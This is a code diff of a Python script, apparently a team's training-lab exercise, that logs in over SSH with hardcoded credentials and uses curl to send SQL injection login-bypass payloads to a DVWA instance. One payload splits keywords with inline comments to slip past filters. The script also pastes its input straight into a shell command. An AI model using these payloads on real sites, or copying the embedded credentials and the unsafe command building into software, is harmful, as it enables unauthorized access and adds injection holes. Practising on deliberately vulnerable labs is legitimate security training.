@@ -1,3 +1,48 @@
+import paramiko
+
+# Название команды: ЧВК Сырочек
+
+hostname = "203.81.208.25"
+password = "#@~79j0gb2$a"
+username = "team06"
+port = 22006
+
+address = "http://dvwa.local"
+
+
+class SSHInterface:
+    def __init__(self):
+        self.client = paramiko.SSHClient()
+        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        self.client.connect(hostname, port, username, password)
+
+    def execute_command(self, request):
+        command = f"""curl -i -d 'username={request}' -d 'password={request}' {address}"""
+
+        stdin, stdout, stderr = self.client.exec_command(command)
+
+        data = stdout.read().decode().split()
+
+        if data:
+            new_data = {
+                "NUMBER_ERROR": data[1],
+                "TEXT_ERROR": " ".join([data[0]] + data[2:]),
+            }
+
+            return new_data
+        return {"NUMBER_ERROR": "None", "TEXT_ERROR": "None"}
+
+    def close(self):
+        self.client.close()
+
+
+if __name__ == "__main__":
+    ssh_interface = SSHInterface()
+
+    print(ssh_interface.execute_command(r"""'OR 1=1--"""))
+    print(ssh_interface.execute_command(r"""'OR EX/**/ISTS(SEL/**/ECT * FR/**/OM users WH/**/ERE username='admin')--"""))
+
+    ssh_interface.close()
 
 # Название команды: ЧВК Сырочек
 # Логин:  team06
@@ -7,45 +52,3 @@
 # ssh: 22006
 # rdp: 33006
 # http://dvwa.local/
-
-
-import paramiko
-
-def startShh():
-    pass
-
-def login():
-    pass
-
-
-hostname = '203.81.208.25'
-port = 22006
-username = 'team06'
-password = '#@~79j0gb2$a'
-
-address = "http://dvwa.local"
-
-client = paramiko.SSHClient()
-
-client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-client.connect(hostname, port, username, password)
-
-# stdin, stdout, stderr = client.exec_command("curl -I --header 'If-Modified-Since: Tue, 11 Dec 2012 10:10:24 GMT' http://dvwa.local")
-
-# stdin, stdout, stderr = client.exec_command(input())
-
-# stdin, stdout, stderr = client.exec_command("curl -I --header 'If-Modified-Since: Tue, 11 Dec 2012 10:10:24 GMT' http://dvwa.local/")
-
-# curl -i -X POST -H --header 'Content-Type: text/html; charset=UTF-8' -d '{"username": "' OR 1=1--", "password": "' OR 1=1--"}' http://dvwa.local
-
-def sshRequest(request):
-    stdin, stdout, stderr = client.exec_command("curl -I --header 'If-Modified-Since: Tue, 11 Dec 2012 10:10:24 GMT' http://dvwa.local")
-    
-    response = stdout.read().decode()
-    print(response)
-    return response
-
-
-
-
